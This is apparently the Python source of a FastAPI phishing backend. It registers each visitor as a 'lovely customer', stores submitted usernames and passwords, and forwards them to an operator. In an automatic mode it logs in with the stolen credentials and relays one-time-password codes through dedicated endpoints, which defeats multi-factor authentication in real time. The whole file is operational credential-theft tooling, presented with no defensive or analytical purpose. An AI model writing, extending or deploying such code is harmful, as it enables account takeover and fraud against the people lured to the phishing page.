from typing import Union, Annotated
import logging
from fastapi import (
    FastAPI,
    Request,
    Header,
    Depends,
    WebSocket,
    HTTPException,
    status,
    Security,
)
from sqlalchemy.orm import Session
from database import SessionLocal, engine
import crud, models, schemas
import json
from fastapi.middleware.cors import CORSMiddleware
import requests
import time
import os
from fastapi.security import APIKeyHeader
from utils import messageAdmin, CONFIG, logger

# import modules.auto_login
from modules.auto_login import auto_login
import threading
from queue import Queue


AUTO_MODE = True

api_key_header = APIKeyHeader(name="X-API-Key")

models.Base.metadata.create_all(bind=engine)

app = FastAPI()

origins = ["*"]
app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# Dependency
def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def get_api_key(api_key_header: str = Security(api_key_header)) -> str:
    if api_key_header != CONFIG["API_KEY"]:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED, detail="Forbidden"
        )


class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            await connection.send_text(message)


manager = ConnectionManager()


@app.get("/")
async def read_root(
    request: Request, user_agent: Annotated[str | None, Header()] = None
):
    await manager.broadcast("i'm here")
    ip = request.client.host
    return {"Hello": f"{ip} {user_agent}"}


@app.get("/hello")
async def create_lovelyclient(
    request: Request,
    user_agent: Annotated[str | None, Header()] = None,
    db: Session = Depends(get_db),
):
    id = int(time.time() * (10**6))
    ip = request.client.host
    new_lovelyclient = models.User(id=id, ip=ip, user_agent=user_agent)
    crud.create_user(db, new_lovelyclient)
    broadcast_msg = {"type": "new", "value": id}
    await manager.broadcast(json.dumps(broadcast_msg))
    # TODO: alet admin
    admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
    # messageAdmin(admin_message)
    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
    messageadmin_thread.start()
    # await manager
    # return to client success
    return id


@app.post("/login/{id}")
def login(
    id: int,
    request: Request,
    item: schemas.Login,
    db: Session = Depends(get_db),
):
    db_user = crud.add_creds(db, id, item.username, item.password)
    if not db_user:
        return '{"status":"Error"}'

    admin_message = f"----\n Creds: \n id: {id}\n username:{item.username}\n password:{item.password} \n----"
    # messageAdmin(admin_message)
    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
    messageadmin_thread.start()

    if AUTO_MODE:
        q = Queue()
        auto_func = threading.Thread(
            target=auto_mode_func,
            args=(
                q,
                id,
                item.username,
                item.password,
            ),
        )
        auto_func_listner = threading.Thread(
            target=auto_mode_func_listner,
            args=(
                q,
                request,
                id,
            ),
        )
        auto_func_listner.start()
        auto_func.start()
        # auto_mode = modules.auto_login(id, item.username, item.password)
        # auto_mode.collect_all()
    return '{"status":"OK"}'


def auto_mode_func_listner(q, request, id):
    while True:
        curr_msg = q.get()
        if curr_msg == None:
            continue
        curr_stat = json.loads(curr_msg)
        print(f"[+] current stat is : {curr_stat}")
        if curr_stat["msg"] == "OTP_code":
            set_OPT_abstracted(id=id, OTP=curr_stat["data"])
            set_action_abstracted(id=id, action="OTP")


def auto_mode_func(q, id, username, password):
    # while True
    id = str(id)
    auto_mode = auto_login(q, id, username, password)
    login_return = json.loads(auto_mode.login())
    if login_return["msg"] != "OTP_timeout":
        auto_mode.collect_all()
    time.sleep(300)  # DEBUG


@app.get("/action/{id}")
def get_action(
    id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    res = crud.get_action(db, id)
    if not res:
        return '{"status":"Error"}'
    return json.dumps({"action": res})


def set_action_abstracted(id, action):
    db: Session = next(get_db())
    db_user = crud.set_action(db, id, action)
    if not db_user:
        return '{"status":"Error"}'

    return '{"status":"OK"}'


@app.put("/action/{id}/{action}")
def set_action(
    id: int,
    action: str,
    request: Request,
    db: Session = Depends(get_db),
):
    return set_action_abstracted(id, action)


@app.get("/OTP/{id}")
def get_OTP(
    id: int,
    request: Request,
    db: Session = Depends(get_db),
):
    curr_OTP = crud.get_OTP(db, id)
    if not curr_OTP:
        return '{"status":"Error"}'
    return json.dumps({"data": curr_OTP})


def set_OPT_abstracted(id, OTP):
    db: Session = next(get_db())
    db_user = crud.set_OTP(db, id, OTP)
    if not db_user:
        return '{"status":"Error"}'

    return '{"status":"OK"}'


@app.put("/OTP/{id}/{OTP}")
def set_OTP(
    id: int,
    OTP: str,
    request: Request,
    db: Session = Depends(get_db),
):
    return set_OPT_abstracted(id, OTP)


# future feature
# @app.websocket("/ws")
# async def websocket_get_newusers(websocket: WebSocket):
#     await manager.connect(websocket)
#     while True:
#         # wait for intry
#         data = await websocket.receive_text()
#         await manager.send_personal_message(f"You wrote: {data}", websocket)


@app.get("/users/all", dependencies=[Depends(get_api_key)])
def get_all(
    request: Request,
    db: Session = Depends(get_db),
):
    db_user = crud.get_users(db)
    if not db_user:
        return ""

    # return only with
    return db_user


@app.get("/user/{id}", dependencies=[Depends(get_api_key)])
def get_User(id: int, request: Request, db: Session = Depends(get_db)):
    db_user = crud.get_user(db, id)
    return db_user
